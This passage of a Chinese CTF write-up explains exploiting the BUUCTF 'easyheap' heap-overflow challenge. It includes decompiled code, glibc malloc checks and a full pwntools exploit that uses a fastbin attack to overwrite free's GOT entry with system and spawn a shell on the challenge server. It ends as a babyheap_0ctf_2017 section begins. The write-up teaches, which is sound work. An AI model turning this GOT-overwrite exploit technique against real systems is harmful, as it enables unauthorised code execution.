<span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到有一个奇怪的函数l33t()，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">l33t</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实在这题没有用，这个路径不存在，不用管了<br>菜单如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       Easy Heap Creator       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个选项函数如下<br>creat_heap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      *(&amp;heaparray + i) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(*(&amp;heaparray + i), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit_heap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(*(&amp;heaparray + v1), v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在溢出<br>delete_heap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针置NULL了，无法uaf<br>先放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26323</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">heaparray_add=<span class="number">0x06020e0</span></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#这里申请0x60-0x6f大小的chunk均可，因为都会放入实际大小0x70的fastbin中</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(heaparray_add-<span class="number">0x33</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x23</span>+p64(free_got)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line">payload3=p64(sys_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>checksec看一眼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec easyheap</span><br><span class="line">[*] <span class="string">&#x27;/home/turing/easyheap&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fe000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>无PIE且got表可写<br>无法uaf，无法double free，但可以多次申请堆块，存在溢出，这里考虑fastbin attack<br><strong>关于double free，因为fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空，且fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证</strong>（在glibc2.29+版本，当chunk将要被放到<code>tcachebin</code>中时，其<code>key</code>字段（<code>fd</code>之后的<code>0x8</code>字节）会被设置为特定值，当free某个chunk时，会检查对应<code>tcachebin</code>中的chunk有无<code>key</code>值与待释放的chunk相等的，如果有则触发安全检测报错，无则free。且当chunk从<code>tcachebin</code>中取出时，<code>key</code>字段会被置为NULL，见<a href="https://r3t2.top/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">另一篇blog</a>），我们考虑chunk1和chunk2，先后free掉chunk1和chunk2，然后再次free chunk2时，便不会被检测到，因为第二次释放chunk2时，fastbin头部是chunk1。<br>在这个过程中，fastbin这样变化</p><p><img src="/images/fastbin_free_chunk1.png"></p><p><img src="/images/fastbin_free_chunk2.png"></p><p><img src="/images/fastbin_free_chunk3.png"></p><p><strong>fastbin中取出chunk是从头部开始取的，放入也是头部插入</strong>，所以此时我们再申请一个同样大小的chunk，便会返回chunk1，这时我们便可以修改chunk1的fd域，伪造一个fake_heap（因为被双重释放，chunk1可以看做还在fastbin里，接在chunk2后），然后我们再申请申请一个同样大小的chunk，返回chunk2，再申请一个同样大小的chunk，返回chunk1，,这时再申请申请一个同样大小的chunk时，便会返回我们想要控制的fake_heap，实现任意地址写（其实需要布置fake_heap的size域使得满足fastbin的要求）<br>值得一提的是，<strong>除了tcachebin中的chunk，其他bin中的chunk的fd和bk指针都是指向堆头地址</strong>，而tcachebin中的chunk的fd指针指向的是mem地址（在<code>safe-linking</code>引入后又有变化，见<a href="https://r3t2.top/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">另一篇blog</a>）<br>这里无法double free，也不能uaf，怎么实现fastbin attack呢？利用溢出就好了，其实无论是uaf，还是double free，还是溢出，都是实现对fastbin中的chunk进行修改，来实现申请回我们控制地址的fake_heap<br>我们回到题目，此题利用heaparray指针数组来索引各个堆块，我们可以直接在ida中看到heaparray的起始地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020E0 heaparray       dq ?                    ; DATA XREF: create_heap+30↑r</span><br></pre></td></tr></table></figure><p>地址为0x6020e0，我们先申请三个堆块，heaparray[0]指向的便是chunk0。我们再edit chunk0时，是利用heaparray[0]索引的，如果我们先把&#x2F;bin&#x2F;sh写入chunk1，再修改heaparray[0]为free的got表地址，此时edit chunk0时其实就是在修改free的got表项，改为system函数后，我们再free chunk1时，其实就是执行system(“&#x2F;bin&#x2F;sh”);<br>于是我们先申请chunk0，chunk1，chunk2，free掉chunk2，再edit chunk1溢出修改chunk2的fd（在bin中的chunk堆头后的数据区的前0x8字节就是fd指针）为heaparray之前的某个地址，我们需要在heaparray附近寻找合适的位置，使得fake_chunk的size域满足fastbin的要求<br>在更高版本的glibc（2.28+）中，fastbin会检查放入和取出的chunk严格满足对应fastbin的size，相同size的chunk才置于同一个fastbin，部分源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新增：严格校验 size 精确匹配链表要求的大小</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (victim) != size)) </span><br><span class="line">&#123;</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): invalid fastbin size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留索引检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fastbin_index (size) != idx)) </span><br><span class="line">&#123;</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留下一个 chunk 大小检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (nextsize &gt;= av-&gt;system_mem)) </span><br><span class="line">&#123;</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题版本为2.23，早期glibc并不会严格检查fake_chunk的size，索引满足即可。在glibc2.23检查的部分源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查 1: 是否属于当前 fastbin 链表</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 2: 下一个 chunk 的 size 是否合法</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(victim, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(chunksize(chunk_at_offset(victim, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出并没有对size的严格检查。其中，检查1的index计算方式如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index = (size &gt;&gt; <span class="number">4</span>) - <span class="number">2</span>  </span><br></pre></td></tr></table></figure><p>此题我们找到这个heaparray-0x33这个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x6020e0-0x33</span><br><span class="line">0x6020ad:       0xfff7bc38e0000000      0x000000000000007f</span><br><span class="line">0x6020bd:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020cd:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020dd:       0x0000603010000000      0x0000603030000000</span><br><span class="line">0x6020ed &lt;heaparray+13&gt;:        0x0000603050000000      0x0000000000000000</span><br><span class="line">0x6020fd &lt;heaparray+29&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60210d &lt;heaparray+45&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60211d &lt;heaparray+61&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60212d &lt;heaparray+77&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60213d:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>发现这个位置的fake_chunk的size域为0x7f，索引(0x7f&gt;&gt;4)-2&#x3D;5&#x3D;(0x70&gt;&gt;4)-2，对于0x70大小的fastbin可以通过检查。至于下一个chunk的size，这个fake_chunk的fd域为0，自然不用考虑了。于是利用这个fake_chunk来修改heaparray[0]。<br>注意在edit chunk1来溢出修改chunk2的fd域时，要保证chunk2的size域为0x71不变以防从fastbin申请回chunk2时出现异常</p><h2 id="0x03-babyheap-0ctf-2017"><a href="#0x03-babyheap-0ctf-2017" class="headerlink" title="0x03 babyheap_0ctf_2017"></a>0x03 babyheap_0ctf_2017</h2><h3 id="复现-unsorted-bin-leak-fastbin-attack-one-gadget-malloc-hook-heapoverflow"><a href="#复现-unsorted-bin-leak-fastbin-attack-one-gadget-malloc-hook-heapoverflow" class="headerlink" title="复现&#x2F;unsorted bin leak&#x2F;fastbin attack&#x2F;one_gadget&#x2F;malloc_hook&#x2F;heapoverflow"></a>复现&#x2F;unsorted bin leak&#x2F;fastbin attack&#x2F;one_gadget&#x2F;malloc_hook&#x2F;heapoverflow</h3><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu(a1, a2);</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Allocate((__int64)v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Free(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Dump(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Allocate函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 